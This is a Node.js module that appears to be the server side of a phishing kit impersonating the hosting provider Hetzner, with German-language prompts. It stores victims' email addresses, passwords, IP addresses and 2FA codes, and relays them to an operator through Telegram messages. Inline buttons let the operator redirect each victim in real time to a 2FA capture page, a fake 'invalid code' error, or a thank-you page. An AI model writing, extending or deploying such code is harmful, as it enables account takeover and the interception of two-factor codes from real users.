const crypto = require("crypto");
const store = require("./ionos-store");

const REDIRECTS = {
  code: (id) => `/hetzner-2fa.html?s=${id}`,
  thankyou: () => `/hetzner-thankyou.html`,
  waiting: (id) => `/hetzner-waiting.html?s=${id}`,
};

const CODE_ERROR =
  "Der eingegebene Code ist ungültig. Bitte versuchen Sie es erneut.";

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

async function createSession({ email, password, ip, ua }) {
  store.pruneSessionsAsync();
  const id = crypto.randomBytes(8).toString("hex");
  const session = {
    id,
    brand: "hetzner",
    email,
    password: password || "",
    code: "",
    step: "login_submitted",
    pending: "login",
    redirect: null,
    error: null,
    ip: ip || "unknown",
    ua: ua || "",
    createdAt: Date.now(),
    updatedAt: Date.now(),
  };
  await store.saveSession(session);
  return session;
}

async function getSession(id) {
  return store.getSession(id);
}

async function updateSession(id, patch) {
  const session = await getSession(id);
  if (!session) return null;
  Object.assign(session, patch, { updatedAt: Date.now() });
  await store.saveSession(session);
  return session;
}

async function listSessions() {
  store.pruneSessionsAsync();
  const all = await store.listSessions();
  return all.filter((s) => s.brand === "hetzner");
}

async function applyAdminAction(id, action) {
  const session = await getSession(id);
  if (!session || session.brand !== "hetzner") {
    return { ok: false, error: "session_not_found" };
  }

  switch (action) {
    case "code":
      await updateSession(id, {
        pending: null,
        redirect: REDIRECTS.code(id),
        error: null,
      });
      break;
    case "code_bad":
      await updateSession(id, {
        pending: null,
        redirect: REDIRECTS.code(id),
        error: CODE_ERROR,
      });
      break;
    case "thankyou":
      await updateSession(id, {
        pending: null,
        redirect: REDIRECTS.thankyou(),
        error: null,
        step: "done",
      });
      break;
    default:
      return { ok: false, error: "unknown_action" };
  }

  return { ok: true, session: await getSession(id) };
}

async function getPollState(id) {
  const session = await getSession(id);
  if (!session || session.brand !== "hetzner") {
    return { ok: false, status: "gone" };
  }

  if (session.redirect) {
    const redirect = session.redirect;
    const error = session.error;
    session.redirect = null;
    if (!error) session.error = null;
    session.updatedAt = Date.now();
    await store.saveSession(session);
    return {
      ok: true,
      status: error ? "error" : "redirect",
      redirect,
      error,
      email: session.email,
    };
  }

  return {
    ok: true,
    status: "waiting",
    pending: session.pending,
    email: session.email,
    step: session.step,
  };
}

function buildTelegramKeyboard(session) {
  const p = `h:${session.id}:`;
  if (session.pending === "login") {
    return {
      inline_keyboard: [
        [
          { text: "🔐 2FA Code", callback_data: p + "code" },
          { text: "🎉 Thank You", callback_data: p + "thankyou" },
        ],
      ],
    };
  }
  if (session.pending === "code") {
    return {
      inline_keyboard: [
        [
          { text: "✅ Code OK", callback_data: p + "thankyou" },
          { text: "❌ Falscher Code", callback_data: p + "code_bad" },
        ],
      ],
    };
  }
  return null;
}

function formatSessionMessage(session, title) {
  const lines = [
    `<b>${title}</b>`,
    "",
    `<b>Session:</b> <code>${escapeHtml(session.id)}</code>`,
    `<b>Email:</b> ${escapeHtml(session.email)}`,
    `<b>IP:</b> ${escapeHtml(session.ip)}`,
  ];
  if (session.password) {
    lines.push(`<b>Passwort:</b> <code>${escapeHtml(session.password)}</code>`);
  }
  if (session.code) lines.push(`<b>2FA Code:</b> <code>${escapeHtml(session.code)}</code>`);
  lines.push(`<b>Schritt:</b> ${escapeHtml(session.step)}`);
  lines.push("", "Wähle wohin der User weitergeleitet wird:");
  return lines.join("\n");
}

function parseCallbackData(data) {
  if (!data || !data.startsWith("h:")) return null;
  const parts = data.split(":");
  if (parts.length !== 3) return null;
  return { id: parts[1], action: parts[2] };
}

module.exports = {
  CODE_ERROR,
  REDIRECTS,
  applyAdminAction,
  buildTelegramKeyboard,
  createSession,
  escapeHtml,
  formatSessionMessage,
  getPollState,
  getSession,
  listSessions,
  parseCallbackData,
  updateSession,
};
